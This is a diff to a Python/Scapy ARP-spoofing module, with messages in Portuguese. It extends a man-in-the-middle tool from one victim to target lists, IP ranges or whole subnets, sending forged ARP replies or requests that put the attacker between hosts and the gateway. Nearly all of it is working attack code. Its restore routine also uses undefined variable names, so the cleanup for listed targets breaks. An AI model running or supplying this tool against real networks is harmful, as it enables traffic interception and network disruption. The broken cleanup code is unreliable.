@@ -2,60 +2,176 @@
 #coding=UTF-8
 
 from scapy.all import *
-from utils import *
-import os
-import sys
+from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
 import threading
-import signal
-
+from time import sleep
 
 
 
 class ARPspoof(object):
 
 
-	def __init__(self, gateway, target):
-
-		self.gateway = gateway
-		self.target = target
-
-	def restore_target(self):
-		print "[*] Restaurando alvo..."
-		send(ARP(op=2, psrc=self.gateway, pdst=self.target, hwdst="ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),count=5)
-		send(ARP(op=2, psrc=self.target, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff",hwsrc=self.target_mac),count=5)
-		set_ip_forwarding(0)
-
-	def get_mac(self, ip_address):
-		responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)
-	 	# Retorna o endereco MAC de uma resposta
-		for s,r in responses:
-			return r[Ether].src
-			return None
-
-	def spoof(self):
-		iptables()
-		set_ip_forwarding(1)	
-		poison_target = ARP()
-		poison_target.op = 2
-		poison_target.psrc = self.gateway
-		poison_target.pdst = self.target
-		poison_target.hwdst = self.target_mac
-		poison_gateway = ARP()
-		poison_gateway.op = 2
-		poison_gateway.psrc = self.target
-		poison_gateway.pdst = self.gateway
-		poison_gateway.hwdst = self.gateway_mac
-
-		print "[*] Iniciando o evenenamento ARP. [Ctrl-C para finalizar]"
+	def __init__(self, gateway, targets, interface, arpmode, myip, mymac):
 
 		try:
-			while True:
-				send(poison_target)
-				send(poison_gateway)
-				time.sleep(4)
-		except KeyboardInterrupt:
-			self.restore_target()
-			print "[*] Evenenamento ARP finalizado."
-			return
+			self.gateway = str(IPAddress(gateway))
+		except AddrFormatError as e:
+			sys.exit("[-] Especifique um endereço IP válido como gateway")
+
+		self.gateway_mac = getmacbyip(gateway)
+		if not self.gateway_mac: sys.exit("[-] Erro: não foi possível resolver o endereço MAC do gateway.")
+
+		
+		self.targets	= self.get_range(targets)
+		self.arpmode	= arpmode
+		self.send	= True
+		self.interval	= 3
+		self.interface	= interface
+		self.myip	= myip
+		self.mymac	= mymac
+		self.arp_cache	= {}
 
 
+
+	def start(self):
+		self.socket = conf.L3socket(iface=self.interface)
+		self.socket2 = conf.L2socket(iface=self.interface)
+
+		if self.arpmode == 'rep':
+			t = threading.Thread(name='ARPspoof-rep', target=self.spoof, args=('is-at',))
+
+		elif self.arpmode == 'req':
+			t = threading.Thread(name='ARPspoof-req', target=self.spoof, args=('who-has',))
+
+		t.setDaemon(True)
+		t.start()
+
+		if self.targets is None:
+			t = threading.Thread(name='ARPmon', target=self.start_arp_mon)
+			t.setDaemon(True)
+			t.start()
+
+	def get_range(self, targets):
+		if targets is None:
+			return None
+
+		try:
+			target_list = []
+			for target in targets.split(','):
+
+
+				if '/' in target:
+					target_list.extend(list(IPNetwork(target)))
+
+				elif '-' in target:
+					start_addr = IPAddress(target.split('-')[0])
+					try:
+						end_addr = IPAddress(target.split('-')[1])
+						ip_range = IPRange(start_addr, end_addr)
+
+					except AddrFormatError:
+						end_addr = list(start_addr.words)
+						end_addr[-1] = target.split('-')[1]
+						end_addr = IPAddress('.'.join(map(str, end_addr)))
+						ip_range = IPRange(start_addr, end_addr)
+
+					
+
+					target_list.extend(list(ip_range))
+
+				else:
+					target_list.append(IPAddress(target))
+
+			return target_list
+
+		except AddrFormatError:
+			sys.exit("Especifique um Endereço/Range IP válido como alvo.")
+
+
+	
+	
+	def resolve_target_mac(self, targetip):
+		targetmac = None
+
+		try:
+			targetmac = self.arp_cache[targetip]
+
+		except KeyError:
+			packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
+
+			try:
+				resp, _ = sndrcv(self.socket2, packet, timeout=2, verbose=False)
+			except Exception as e:
+				resp = ''
+				if "Interrupted system call" not in e:
+					print "[!] Exception occurred while poisoning {}: {}".format(targetip, e)
+			if len(resp) > 0:
+				targetmac = resp[0][1].hwsrc
+				self.arp_cache[targetip] = targetmac
+				print "Resolvido {} --> {}".format(targetip, targetmac)
+			else:
+				print "Não foi possivel resolver o endereço MAC de {}".format(targetip)
+		return targetmac
+
+
+
+
+
+	def spoof(self, arpmode):
+		sleep(2)
+		while self.send:
+
+			if self.targets is None:
+				self.socket2.send(Ether(src=self.mymac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=self.mymac, psrc=self.gateway, op=arpmode))
+
+			elif self.targets:
+				for target in self.targets:
+					targetip = str(target)
+
+					if (targetip != self.myip):
+						targetmac = self.resolve_target_mac(targetip)
+
+						
+						if targetmac is not None:
+							try:
+								print "[+]Evenenando {} <--> {}".format(targetip, self.gateway)
+								self.socket2.send(Ether(src=self.mymac, dst=targetmac)/ARP(pdst=targetip, psrc=self.gateway, hwdst=targetmac, op=arpmode))
+								self.socket2.send(Ether(src=targetmac, dst=self.gateway_mac)/ARP(pdst=self.gateway, psrc=targetip, hwdst=self.gateway_mac, op=arpmode))
+						
+							except Exception as e:
+								if "Interrupted system call" not in e:
+									print "[!] Exceção ocorreu enquanto envenenava {}: {}".format(targetip, e)
+			sleep(self.interval)
+
+
+
+	
+	def stop(self):
+		self.send = False
+		sleep(3)
+		count = 2
+
+		if self.targets is None:
+			print "[*] Restaurando conexão de sub-rede com {} pacotes".format(count)
+			pkt = Ether(src=self.gateway_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=self.gateway_mac, psrc=self.gateway, op="is-at")
+			for i in range(0, count):
+				self.socket2.send(pkt)
+
+		elif self.targets:
+			for target in self.targets:
+				target_ip = str(target)
+				target_mac = self.resolve_target_mac(target_ip)
+
+				if targetmac is not None:
+					print "[+] Restaurando conexão {} <--> {} com {} pacotes por host".format(target_ip, self.gateway, count)
+
+					try:
+						for i in range(0,count):
+							self.socket2.send(Ether(src=targetmac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=self.gateway, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))
+							self.socket2.send(Ether(src=self.gateway_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=targetip, psrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac))
+					except Exception as e:
+						if "Interrupted system call" not in e:
+							print "Exceção ocorreu enquanto envenava {}: {}".format(targetip, e)
+
+		self.socket.close()
+		self.socket2.close()
